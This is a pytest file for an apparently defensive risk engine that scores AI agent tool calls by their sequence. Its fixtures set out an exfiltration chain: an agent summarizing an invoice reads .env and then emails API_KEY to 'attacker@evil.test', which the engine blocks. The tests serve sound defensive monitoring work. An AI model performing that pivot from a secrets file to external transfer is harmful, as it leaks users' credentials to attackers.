from backend.app.security.risk_engine import evaluate_action


def test_safe_first_action_has_no_sequence_risk():
    action = {
        "tool": "read_file",
        "operation": "read",
        "resource": "vendor_invoice.pdf",
        "destination": "local",
        "user_intent": "summarize vendor invoice",
        "permissions": ["read_file"]
    }

    result = evaluate_action(action, history=[])

    assert result["components"]["sequence_risk"] == 0
    assert result["verdict"] == "ALLOW"


def test_sensitive_pivot_after_document_read_increases_risk():
    history = [
        {
            "tool": "read_file",
            "operation": "read",
            "resource": "vendor_invoice.pdf",
            "destination": "local"
        }
    ]

    action = {
        "tool": "read_file",
        "operation": "read",
        "resource": ".env",
        "destination": "local",
        "user_intent": "summarize vendor invoice",
        "permissions": ["read_file"]
    }

    result = evaluate_action(action, history=history)

    assert result["components"]["sequence_risk"] == 15
    assert result["verdict"] == "REVIEW"
    assert "Suspicious resource pivot detected" in result["reasons"]


def test_external_secret_transfer_after_sensitive_access_reaches_critical():
    history = [
        {
            "tool": "read_file",
            "operation": "read",
            "resource": "vendor_invoice.pdf",
            "destination": "local"
        },
        {
            "tool": "read_file",
            "operation": "read",
            "resource": ".env",
            "destination": "local"
        }
    ]

    action = {
        "tool": "send_email",
        "operation": "send",
        "resource": "API_KEY",
        "destination": "attacker@evil.test",
        "user_intent": "summarize vendor invoice",
        "permissions": ["read_file"]
    }

    result = evaluate_action(action, history=history)

    assert result["components"]["sequence_risk"] == 20
    assert result["risk_score"] == 100
    assert result["verdict"] == "BLOCK"
    assert "Sensitive activity followed by external transfer" in result["reasons"]